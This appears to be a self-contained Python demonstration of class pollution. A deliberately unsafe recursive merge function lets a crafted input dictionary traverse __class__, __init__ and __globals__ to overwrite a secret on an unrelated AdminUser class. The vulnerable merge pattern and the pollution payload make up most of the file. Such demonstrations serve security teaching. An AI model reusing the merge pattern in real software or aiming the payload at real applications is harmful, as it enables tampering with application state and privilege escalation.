class User:
    pass

class RegularUser(User):
    def __init__(self) -> None:
        super().__init__()
        self.id = 0

class AdminUser(User):
    secret = "very secret secret"
    def get_secret(self):
        return self.secret


def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

admin = AdminUser()
user = RegularUser()
print("secret before pollution: " + admin.get_secret())
user_input = {
    "__class__":{
        "__init__": {
            "__globals__": {
                "AdminUser": {
                    "secret": "polluted secret"
                }
            }
        }
    }
}
merge(user_input, user)
print("secret after pollution: " + admin.get_secret())
